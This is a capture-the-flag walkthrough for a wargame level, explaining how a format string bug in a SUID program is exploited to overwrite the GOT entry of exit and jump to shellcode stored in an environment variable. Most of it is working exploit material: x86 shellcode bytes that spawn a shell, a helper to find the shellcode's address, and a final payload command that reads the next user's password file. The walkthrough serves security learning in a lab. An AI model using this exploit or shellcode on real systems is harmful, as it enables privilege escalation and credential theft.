# Walkthrough - Level 05

The program has SUID permissions from the user `level06`, which will allow us to obtain their flag.

# Disassembly

- A `fgets` function that reads 100 bytes from stdin
- A `for` loop that converts uppercase to lowercase
- A `printf` that displays the converted string
- A call to the `exit` function

# Exploit

The goal is to rewrite the GOT (Global Offset Table) of the `exit` function to make it jump to a shellcode that is in the environment variables. In this case, we cannot use an overflow with the `fgets` function because it reads into a larger buffer. However, `printf` has no specific format, using the format read from the standard input.

There is a special printf formatting with `%n` that allows storing the number of printed characters directly into an address.
```c
#include <stdio.h>
int main(void) {
    int a = 0;
    printf("Hello world\n%n", &a);
    printf("a : %d\n", a);
    return 0;
}
```
```
Hello World
a : 12
```
We can then use the format `%n` by passing the address of `m` as an argument to modify its value.

The arguments of variadic functions (like `printf`) are passed on the stack and not in registers. This allows us to empty our stack using the following format:
```bash
./level05
%08x %08x %08x %08x %08x %08x %08x
```
Now we want to find the number of arguments to remove from the stack before accessing the buffer (`s`).
```bash
./level05
aaaa %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
```
```
aaaa 00000064 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 00000000 ffffffff ffffd774 f7fdb000 61616161 38302520 30252078 25207838
```
As shown above, we access the buffer (`s`) after popping the stack 9 times (`0x61` corresponds to `a` in ASCII).

Then we need the address that is dereferenced by the GOT (`exit`), which we can get using GDB.
```bash
gdb ./level05
(gdb) disas exit
Dump of assembler code for function exit@plt:
0x08048370 <+0>: jmp *0x80497e0
0x08048376 <+6>: push $0x18
0x0804837b <+11>: jmp 0x8048330
End of assembler dump.
```
The address to rewrite is therefore `0x80497e0`.

Now we need the address of a shellcode, which we will inject into the environment variables and get its address with the following script:
```bash
export SHELLCODE=$(python -c 'print("\x90" * 20 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")')
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
    char *ptr;
    if(argc < 3) {
        printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]); /* get env var location */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
    printf("%s will be at %p\n", argv[1], ptr);
}
```
We must remember to compile the program with the `-m32` flag to force 32-bit compilation.
```bash
gcc /tmp/env_variable.c -m32 -o /tmp/env_variable
/tmp/env_variable SHELLCODE ./level05
```
```
SHELLCODE will be at 0xffffd8d5
```
`0xffffd8d5 => 4294957269`

Since the address is very large, we will write it using two `%n` by writing 2 bytes then 2 more bytes.

The first value to store is `0xd8d5 = 55509` (as we are in little-endian)
`55509 - 4 - 4 - 4 - 8 * 8 = 55433`
The second value to store is `0xffff = 65535`
`65535 - 55509 = 10026`

With the printf padding, the complete command is therefore:
```bash
(python -c 'print("\xe0\x97\x04\x08" + "A" * 4 + "\xe2\x97\x04\x08" + "%08x" * 8 + "%055433x" + "%n" + "%010026x" + "%n")'; echo "cat /home/users/level06/.pass") | ./level05
```